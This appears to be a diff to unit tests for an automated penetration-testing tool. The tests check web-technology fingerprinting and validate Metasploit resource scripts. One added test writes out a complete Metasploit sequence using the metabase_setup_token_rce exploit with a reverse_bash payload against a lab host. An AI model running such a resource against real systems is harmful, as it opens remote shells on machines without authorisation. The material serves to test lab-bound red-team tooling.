@@ -20,7 +20,7 @@ from medflow_redteam.command_planner import (
 )
 from medflow_redteam.generated_tools import load_generated_tool_specs, resolve_generated_tool_code, validate_generated_tool_code
 from medflow_redteam.identity import analyze_identity_logs
-from medflow_redteam.tools import normalize_validation_status, web_control_checks
+from medflow_redteam.tools import normalize_validation_status, route_technology_signals, web_control_checks
 
 
 class RedTeamCoreTests(unittest.TestCase):
@@ -95,6 +95,17 @@ class RedTeamCoreTests(unittest.TestCase):
         )
         self.assertGreaterEqual(result["count"], 2)
 
+    def test_spa_routes_do_not_create_framework_false_positives(self) -> None:
+        signals = route_technology_signals(
+            "http://lab:3000/functionRouter",
+            "Metabase",
+            "<html><title>Metabase</title><script src='/app.js'></script></html>",
+            200,
+        )
+        self.assertIn("metabase", signals)
+        self.assertNotIn("spring", signals)
+        self.assertNotIn("struts", signals)
+
     def test_generated_tool_specs_from_dynamic_cache_are_valid(self) -> None:
         specs = load_generated_tool_specs()
         for item in specs:
@@ -160,6 +171,41 @@ class RedTeamCoreTests(unittest.TestCase):
                 "exploit",
             ),
             msf_plan["resource_lines"],
+        )
+        self.assertEqual(
+            validate_metasploit_resource(
+                [
+                    "use exploit/linux/http/metabase_setup_token_rce",
+                    "set RHOSTS 172.29.10.10",
+                    "set RPORT 3000",
+                    "set SSL false",
+                    "set TARGETURI /",
+                    "set VHOST lab.local",
+                    "set PAYLOAD cmd/unix/reverse_bash",
+                    "run -j",
+                    "sleep 12",
+                    "sessions -l",
+                    "sessions -K",
+                    "exit -y",
+                ],
+                "172.29.10.10",
+                "exploit/linux/http/metabase_setup_token_rce",
+                "exploit",
+            ),
+            [
+                "use exploit/linux/http/metabase_setup_token_rce",
+                "set RHOSTS 172.29.10.10",
+                "set RPORT 3000",
+                "set SSL false",
+                "set TARGETURI /",
+                "set VHOST lab.local",
+                "set PAYLOAD cmd/unix/reverse_bash",
+                "run -j",
+                "sleep 12",
+                "sessions -l",
+                "sessions -K",
+                "exit -y",
+            ],
         )
         with self.assertRaises(ValueError):
             validate_metasploit_resource(
